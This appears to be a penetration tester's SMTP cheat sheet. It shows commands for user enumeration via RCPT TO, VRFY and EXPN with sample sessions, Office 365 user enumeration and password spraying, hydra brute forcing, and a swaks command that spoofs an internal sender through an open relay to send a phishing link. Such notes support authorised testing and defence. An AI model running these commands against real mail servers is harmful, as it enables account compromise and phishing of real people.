# 25,465,587 - SMTP

### Service enumeration

#### Scan

```sh
nmap <IP> -p25 --script smtp-*
```

#### Banner grabbing

```sh
nc -nv <IP> 25
telnet <IP> 25
```

### User enumeration

#### RCPT TO

```sh
# Enumerate users manually with the RCPT TO method
$ nc -nv <IP> 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
MAIL FROM:example@domain.com
250 2.1.0 example@domain.com... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```

#### VRFY

```sh
# Enumerate users manually with the VRFY method
$ nc -nv <IP> 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
VRFY root
250 Super-User root@myhost
VRFY blah
550 blah... User unknown
```

#### EXPN

```sh
# Enumerate users manually with the EXPN method
$ nc -nv <IP> 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 ed.williams@myhost
EXPN sshd
250 2.1.5 sshd privsep sshd@myhost
```

#### Automatic tools

```sh
https://github.com/pentestmonkey/smtp-user-enum
smtp-user-enum -M <RCPT | VRFY | EXPN> -U <USER_LIST> -D <DOMAIN> -t <IP>
nmap --script smtp-enum-users -p25 <IP>
auxiliary/scanner/smtp/smtp_enum
```

#### Cloud

{% code overflow="wrap" %}
```sh
# Validate the domain is using o365
https://github.com/0xZDH/o365spray
python3 o365spray.py --validate --domain <DOMAIN>   

# Enumerate users
python3 o365spray.py --enum -U <USER_LIST> --domain <DOMAIN>
```
{% endcode %}

### Brute force

```sh
# Might need to pass the domain after the username (bob@test.local)
hydra -L <USER_LIST> -p '<PASS>' <PROTOCOL>://<IP>

# Careful not to lock out any account
python3 o365spray.py --spray -U <USER_LIST> -p '<PASS>' --count 1 --lockout 1 --domain <DOMAIN>
```

### Open relay

Open relays allow mail from any source to be transparently re-routed through the open relay server. This behavior masks the source of the messages and makes it look like the mail originated from the open relay server.

From an attacker's standpoint, we can abuse this for phishing by sending emails as non-existing users or spoofing someone else's email. For example, imagine we are targeting an enterprise with an open relay mail server, and we identify they use a specific email address to send notifications to their employees. We can send a similar email using the same address and add our phishing link with this information.

```sh
# Use any mail client to send email => impersonate notifications@internal.com to phish employees@internal.com
swaks --from notifications@internal.com --to employees@internal.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server <MAIL_SERVER_IP>
```
